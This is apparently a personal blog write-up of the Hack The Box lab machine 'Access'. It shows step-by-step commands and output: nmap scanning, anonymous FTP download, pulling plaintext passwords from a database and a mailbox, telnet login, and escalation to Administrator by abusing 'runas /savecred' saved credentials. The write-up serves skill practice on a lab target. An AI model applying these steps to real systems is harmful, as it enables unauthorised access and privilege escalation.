---
title: 'Access: Hack The Box writeup'
date: '2019-03-02'
comments: true
---

[![Access info page](/img/access-info.png)](https://www.hackthebox.eu/home/machines/profile/156)

Recently I discovered [Hack The Box](https://www.hackthebox.eu/home), an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called [Access](https://www.hackthebox.eu/home/machines/profile/156). In this blog post I'll walk through how I solved it. If you don't want any spoilers, look away now!

## Information gathering

Let's start with an `nmap` scan to see what services are running on the box.

```shell
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.98
...
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd (no more connections allowed)
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
```

`nmap` has found three services running: FTP, telnet, and an HTTP server. Let's see what's running on the HTTP server.

![](/img/htb-access-http.png)

It's just a static page, showing an image. Nothing interesting, so let's move on for now.

## Anonymous FTP

`nmap` showed that there is an FTP server running, with anonymous login allowed. Let's see what's on that server

```shell
# ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> ls Backups
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> ls Engineer
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
```

There are some interesting files here, let's download them and analyse them

```shell
# wget ftp://anonymous:anonymous@10.10.10.98 --no-passive-ftp --mirror
--2019-02-02 15:37:26--  ftp://anonymous:*password*@10.10.10.98/
           => ‘10.10.10.98/.listing’
Connecting to 10.10.10.98:21... connected.
Logging in as anonymous ... Logged in!
...
FINISHED --2019-02-02 15:37:28--
Total wall clock time: 1.8s
Downloaded: 5 files, 5.4M in 1.4s (3.99 MB/s)
```

## Microsoft Access

We've got a `.mdb` file—which is a Microsoft Access database file—and a zip file. If we take a quick look at the zip file it's password protected. We'll have to come back the that later.

We can examine `backup.mdb` using MDB tools. Maybe there's something we can use there.

```shell
# mdb-tables Backups/backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
```

It looks like there's a lot of autogenerated tables here, but those `auth_*` tables look interesting.

```shell
# mdb-export Backups/backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Awesome! So we've got some credentials for `engineer`, and we've got a password protected zip file in the `Engineer` directory.

## Microsoft Outlook

```shell
# 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-7820HQ CPU @ 2.90GHz (906E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870

# ls
'Access Control.pst'  'Access Control.zip'
```

That worked! Now we've got the mailbox backup for the engineer, but we first need to convert it to something that we can read more easily on Linux.

```shell
# readpst Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
```

Let's take a peek at the engineer's mailbox

```shell
# mail -f Access\ Control.mbox
mail version v14.9.11.  Type `?' for help
'/root/10.10.10.98/Engineer/Access Control.mbox': 1 message
▸O  1 john@megacorp.com  2018-08-23 23:44   87/3112  MegaCorp Access Control System "security" account
?
[-- Message  1 -- 87 lines, 3112 bytes --]:
From "john@megacorp.com" Thu Aug 23 23:44:07 2018
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000

[-- #1.1 73/2670 multipart/alternative --]



[-- #1.1.1 15/211 text/plain, 7bit, utf-8 --]

Hi there,



The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is pass
ed on to your engineers.



Regards,

John



[-- #1.1.2 51/2211 text/html, 7bit, us-ascii --]
?
```

Another set of credentials! I wonder what these are used for? Let's try FTP first

```shell
# ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:jamie): security
331 Password required for security.
Password:
530 User cannot log in.
ftp: Login failed.
```

No dice ☹. The only other option is `telnet`.

## Telnet

```shell
# telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

We're in! The `user.txt` should be located on `security`'s Desktop

```posh
C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security

02/02/2019  03:56 PM    <DIR>          .
02/02/2019  03:56 PM    <DIR>          ..
08/24/2018  07:37 PM    <DIR>          .yawcam
08/21/2018  10:35 PM    <DIR>          Contacts
08/28/2018  06:51 AM    <DIR>          Desktop
08/21/2018  10:35 PM    <DIR>          Documents
08/21/2018  10:35 PM    <DIR>          Downloads
08/21/2018  10:35 PM    <DIR>          Favorites
08/21/2018  10:35 PM    <DIR>          Links
08/21/2018  10:35 PM    <DIR>          Music
08/21/2018  10:35 PM    <DIR>          Pictures
08/21/2018  10:35 PM    <DIR>          Saved Games
08/21/2018  10:35 PM    <DIR>          Searches
08/24/2018  07:39 PM    <DIR>          Videos
               1 File(s)        964,179 bytes
              14 Dir(s)  16,745,127,936 bytes free

C:\Users\security>cd Desktop

C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Desktop

08/28/2018  06:51 AM    <DIR>          .
08/28/2018  06:51 AM    <DIR>          ..
08/21/2018  10:37 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  16,744,726,528 bytes free

C:\Users\security\Desktop>more user.txt
<SNIP>
```

## Privilege escalation

Now that we've got the first flag, we need to escalate to `root` access—or more specifically `Administrator` on Windows.

The `.yawcam` directory looks out of the ordinary.

```posh
dir .yawcam
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\.yawcam

08/24/2018  07:37 PM    <DIR>          .
08/24/2018  07:37 PM    <DIR>          ..
08/23/2018  10:52 PM    <DIR>          2
08/22/2018  06:49 AM                 0 banlist.dat
08/23/2018  10:52 PM    <DIR>          extravars
08/22/2018  06:49 AM    <DIR>          img
08/23/2018  10:52 PM    <DIR>          logs
08/22/2018  06:49 AM    <DIR>          motion
08/22/2018  06:49 AM                 0 pass.dat
08/23/2018  10:52 PM    <DIR>          stream
08/23/2018  10:52 PM    <DIR>          tmp
08/23/2018  10:34 PM                82 ver.dat
08/23/2018  10:52 PM    <DIR>          www
08/24/2018  07:37 PM             1,411 yawcam_settings.xml
               4 File(s)          1,493 bytes
              10 Dir(s)  16,764,841,984 bytes free
```

However poking around in there proved fruitless. Maybe there's a way to use this, but I couldn't figure anything out.

Let's keep looking

```posh
C:\Users\security>cd ../

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users

02/02/2019  04:15 PM    <DIR>          .
02/02/2019  04:15 PM    <DIR>          ..
08/23/2018  11:46 PM    <DIR>          Administrator
02/02/2019  04:15 PM    <DIR>          engineer
02/02/2019  04:14 PM    <DIR>          Public
02/02/2019  04:16 PM    <DIR>          security
               0 File(s)              0 bytes
               6 Dir(s)  16,754,778,112 bytes free
```

Maybe one of the other users has something interesting we can use?

```posh
C:\Users>cd engineer
Access is denied.
```

I didn't really expect that to work anyway

```posh
C:\Users>cd Public

C:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public

02/02/2019  04:14 PM    <DIR>          .
02/02/2019  04:14 PM    <DIR>          ..
07/14/2009  05:06 AM    <DIR>          Documents
07/14/2009  04:57 AM    <DIR>          Downloads
07/14/2009  04:57 AM    <DIR>          Music
07/14/2009  04:57 AM    <DIR>          Pictures
07/14/2009  04:57 AM    <DIR>          Videos
               1 File(s)        964,179 bytes
               7 Dir(s)  16,723,468,288 bytes free
```

Wait a minute, we're missing some of the standard Windows directories. Let's have a closer look.

```posh

C:\Users\Public>dir /A
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public

02/02/2019  04:14 PM    <DIR>          .
02/02/2019  04:14 PM    <DIR>          ..
08/28/2018  06:51 AM    <DIR>          Desktop
07/14/2009  04:57 AM               174 desktop.ini
07/14/2009  05:06 AM    <DIR>          Documents
07/14/2009  04:57 AM    <DIR>          Downloads
07/14/2009  02:34 AM    <DIR>          Favorites
07/14/2009  04:57 AM    <DIR>          Libraries
07/14/2009  04:57 AM    <DIR>          Music
07/14/2009  04:57 AM    <DIR>          Pictures
07/14/2009  04:57 AM    <DIR>          Videos
               2 File(s)        964,353 bytes
              10 Dir(s)  16,717,438,976 bytes free
```

Desktop has a much more recent modification date than everything else

```posh
C:\Users\Public>cd Desktop

C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public\Desktop

08/22/2018  09:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)  16,711,475,200 bytes free
```

That's because there's a shortcut there.

Now, I'm not sure of the best way to view a `.lnk` on `cmd.exe` via `telnet`, but this is what I came up with. If anyone knows of a better way, please let me know!

```posh
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows��:��M�:*wWindowsV1MV�System32��:��MV�*�System32X2P�:�
                                                                                                        runas.exe��:1��:1�*Yrunas.exeL-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                      �wN���]N�D.��Q���`�Xaccess�_���8{E�3
                                                          O�j)�H���
                                                                   )ΰ[�_���8{E�3
                                                                                O�j)�H���
                                                                                         )ΰ[�	��1SPS�XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
```

It's a bit difficult to read, but it looks like the shortcut runs a program as the `Administrator` using saved credentials. We can use that.

```posh
C:\Users\Public\Desktop>runas /user:Administrator /savecred "cmd.exe /c more C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\Desktop\output.txt"
```

Did it work?

```posh
C:\Users\Public\Desktop>more output.txt
<SNIP>
```

Yes! From there we could generate a reverse shell using `msfvenom` and run that as `Administrator`, but I've got the flag so I'll leave it there for now.
